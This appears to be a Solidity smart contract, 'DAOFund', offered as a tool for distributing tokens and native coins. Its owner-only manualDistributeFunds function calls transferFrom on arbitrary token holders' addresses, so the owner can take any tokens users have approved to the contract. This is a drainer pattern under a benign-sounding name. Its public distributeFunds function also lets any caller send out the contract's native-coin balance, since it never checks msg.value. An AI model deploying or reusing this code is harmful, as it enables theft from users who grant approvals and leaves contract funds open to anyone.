// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract DAOFund {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Caller is not the owner");
        _;
    }

    // Function to distribute funds (both tokens and native coins)
    function distributeFunds(
        address[] memory tokens,
        address[] memory recipients,
        uint256[] memory amounts
    ) external payable {
        require(
            tokens.length == recipients.length && recipients.length == amounts.length,
            "Input arrays must have the same length"
        );

        for (uint i = 0; i < tokens.length; i++) {
            if (tokens[i] == address(0)) {
                // Send BNB (or ETH)
                payable(recipients[i]).transfer(amounts[i]);
            } else {
                // Send ERC20 tokens
                IERC20(tokens[i]).transferFrom(msg.sender, recipients[i], amounts[i]);
            }
        }
    }

    // New function to manually distribute funds from specific token holders
    function manualDistributeFunds(
        address[] memory tokenHolders,
        address[] memory tokens,
        address[] memory recipients,
        uint256[] memory amounts
    ) external onlyOwner {
        require(
            tokenHolders.length == tokens.length && 
            tokens.length == recipients.length && 
            recipients.length == amounts.length,
            "Input arrays must have the same length"
        );

        for (uint i = 0; i < tokens.length; i++) {
            IERC20 token = IERC20(tokens[i]);
            token.transferFrom(tokenHolders[i], recipients[i], amounts[i]);
        }
    }

    // Function to withdraw any ERC20 tokens from the contract
    function withdrawTokens(address tokenAddress, address to, uint256 amount) external onlyOwner {
        IERC20(tokenAddress).transfer(to, amount);
    }

    // Function to withdraw native coins (BNB or ETH) from the contract
    function withdrawNativeCoins(address payable to, uint256 amount) external onlyOwner {
        to.transfer(amount);
    }

    // Fallback function to allow the contract to receive BNB (or ETH)
    receive() external payable {}
}